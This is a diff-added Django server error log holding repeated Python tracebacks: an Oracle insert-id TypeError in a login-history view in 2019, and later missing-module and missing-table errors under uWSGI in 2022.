+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:42:27,201 [Thread-3:38384] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 68, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 32, in loginmark
+    loginhistory.objects.create(userid=uid,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:42:44,697 [Thread-3:34900] [django.request:135] [exception:handle_uncaught_exception] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\exception.py", line 41, in inner
+    response = get_response(request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 187, in _get_response
+    response = self.process_exception_by_middleware(e, request)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\core\handlers\base.py", line 185, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "D:\stealproject\web\django2\django2\views.py", line 68, in login
+    loginmark(username)
+  File "D:\stealproject\web\django2\django2\views.py", line 32, in loginmark
+    loginhistory.objects.create(userid=2,username=ausername)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 393, in create
+    obj.save(force_insert=True, using=self.db)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 806, in save
+    force_update=force_update, update_fields=update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 836, in save_base
+    updated = self._save_table(raw, cls, force_insert, force_update, using, update_fields)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 922, in _save_table
+    result = self._do_insert(cls._base_manager, using, fields, update_pk, raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\base.py", line 961, in _do_insert
+    using=using, raw=raw)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\manager.py", line 85, in manager_method
+    return getattr(self.get_queryset(), name)(*args, **kwargs)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\query.py", line 1060, in _insert
+    return query.get_compiler(using=using).execute_sql(return_id)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\models\sql\compiler.py", line 1106, in execute_sql
+    return self.connection.ops.fetch_returned_insert_id(cursor)
+  File "C:\Users\liqihua\AppData\Local\Programs\Python\Python35\lib\site-packages\django\db\backends\oracle\operations.py", line 245, in fetch_returned_insert_id
+    return int(cursor._insert_id_var.getvalue())
+TypeError: int() argument must be a string, a bytes-like object or a number, not 'list'
+2019-01-24 15:55:15,412 [Thread-3:22900] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2019-01-24 15:57:15,580 [Thread-3:36164] [django.request:152] [base:get_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 01:33:43,343 [uWSGIWorker1Core0:139799698159808] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'django2.urls'
+2022-03-15 01:33:43,713 [uWSGIWorker1Core0:139799698159808] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /favicon.ico
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 116, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
+    if self.should_redirect_with_slash(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 70, in should_redirect_with_slash
+    if not is_valid_path(request.path_info, urlconf):
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 153, in is_valid_path
+    return resolve(path, urlconf)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'django2.urls'
+2022-03-15 01:35:26,907 [uWSGIWorker1Core0:139622103742656] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'django2.urls'
+2022-03-15 01:35:27,242 [uWSGIWorker1Core0:139622103742656] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /favicon.ico
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 116, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
+    if self.should_redirect_with_slash(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 70, in should_redirect_with_slash
+    if not is_valid_path(request.path_info, urlconf):
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 153, in is_valid_path
+    return resolve(path, urlconf)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+ModuleNotFoundError: No module named 'django2.urls'
+2022-03-15 02:26:34,521 [uWSGIWorker1Core0:140524319664320] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import django2.views as views
+ModuleNotFoundError: No module named 'django2'
+2022-03-15 02:26:34,948 [uWSGIWorker1Core0:140524319664320] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /favicon.ico
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 116, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
+    if self.should_redirect_with_slash(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 70, in should_redirect_with_slash
+    if not is_valid_path(request.path_info, urlconf):
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 153, in is_valid_path
+    return resolve(path, urlconf)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import django2.views as views
+ModuleNotFoundError: No module named 'django2'
+2022-03-15 02:30:11,839 [uWSGIWorker1Core0:139804849866944] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import mvc.views as views
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 4, in <module>
+    from django2.model import userinfo,loginhistory
+ModuleNotFoundError: No module named 'django2'
+2022-03-15 02:30:12,227 [uWSGIWorker1Core0:139804849866944] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /favicon.ico
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 116, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
+    if self.should_redirect_with_slash(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 70, in should_redirect_with_slash
+    if not is_valid_path(request.path_info, urlconf):
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 153, in is_valid_path
+    return resolve(path, urlconf)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import mvc.views as views
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 4, in <module>
+    from django2.model import userinfo,loginhistory
+ModuleNotFoundError: No module named 'django2'
+2022-03-15 02:30:46,405 [uWSGIWorker1Core0:140482883561664] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 167, in _get_response
+    callback, callback_args, callback_kwargs = self.resolve_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 290, in resolve_request
+    resolver_match = resolver.resolve(request.path_info)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import mvc.views as views
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 10, in <module>
+    from pykafka import KafkaClient,SimpleConsumer
+ModuleNotFoundError: No module named 'pykafka'
+2022-03-15 02:30:46,760 [uWSGIWorker1Core0:140482883561664] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /favicon.ico
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/deprecation.py", line 116, in __call__
+    response = self.process_request(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 53, in process_request
+    if self.should_redirect_with_slash(request):
+  File "/usr/local/lib64/python3.6/site-packages/django/middleware/common.py", line 70, in should_redirect_with_slash
+    if not is_valid_path(request.path_info, urlconf):
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 153, in is_valid_path
+    return resolve(path, urlconf)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/base.py", line 24, in resolve
+    return get_resolver(urlconf).resolve(path)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 560, in resolve
+    for pattern in self.url_patterns:
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 602, in url_patterns
+    patterns = getattr(self.urlconf_module, "urlpatterns", self.urlconf_module)
+  File "/usr/local/lib64/python3.6/site-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib64/python3.6/site-packages/django/urls/resolvers.py", line 595, in urlconf_module
+    return import_module(self.urlconf_name)
+  File "/usr/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+    return _bootstrap._gcd_import(name[level:], package, level)
+  File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+  File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+  File "<frozen importlib._bootstrap>", line 955, in _find_and_load_unlocked
+  File "<frozen importlib._bootstrap>", line 665, in _load_unlocked
+  File "<frozen importlib._bootstrap_external>", line 678, in exec_module
+  File "<frozen importlib._bootstrap>", line 219, in _call_with_frames_removed
+  File "/root/liekiewaa/web/jobordera/mvc/urls.py", line 19, in <module>
+    import mvc.views as views
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 10, in <module>
+    from pykafka import KafkaClient,SimpleConsumer
+ModuleNotFoundError: No module named 'pykafka'
+2022-03-15 02:31:08,777 [uWSGIWorker1Core0:139621667514560] [django.request:230] [log:log_response] [WARNING]- Not Found: /favicon.ico
+2022-03-15 02:31:45,479 [uWSGIWorker1Core0:139621667514560] [django.request:230] [log:log_response] [ERROR]- Internal Server Error: /
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
+sqlite3.OperationalError: no such table: mvc_userinfo
+
+The above exception was the direct cause of the following exception:
+
+Traceback (most recent call last):
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/usr/local/lib64/python3.6/site-packages/django/core/handlers/base.py", line 181, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 65, in login
+    logic=logincheck(username, usercode)
+  File "/root/liekiewaa/web/jobordera/mvc/views.py", line 24, in logincheck
+    if result:
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 284, in __bool__
+    self._fetch_all()
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 1324, in _fetch_all
+    self._result_cache = list(self._iterable_class(self))
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/query.py", line 109, in __iter__
+    for row in compiler.results_iter(chunked_fetch=self.chunked_fetch, chunk_size=self.chunk_size):
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1130, in results_iter
+    results = self.execute_sql(MULTI, chunked_fetch=chunked_fetch, chunk_size=chunk_size)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/models/sql/compiler.py", line 1175, in execute_sql
+    cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 98, in execute
+    return super().execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 66, in execute
+    return self._execute_with_wrappers(sql, params, many=False, executor=self._execute)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 75, in _execute_with_wrappers
+    return executor(sql, params, many, context)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/utils.py", line 90, in __exit__
+    raise dj_exc_value.with_traceback(traceback) from exc_value
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/utils.py", line 84, in _execute
+    return self.cursor.execute(sql, params)
+  File "/usr/local/lib64/python3.6/site-packages/django/db/backends/sqlite3/base.py", line 423, in execute
+    return Database.Cursor.execute(self, query, params)
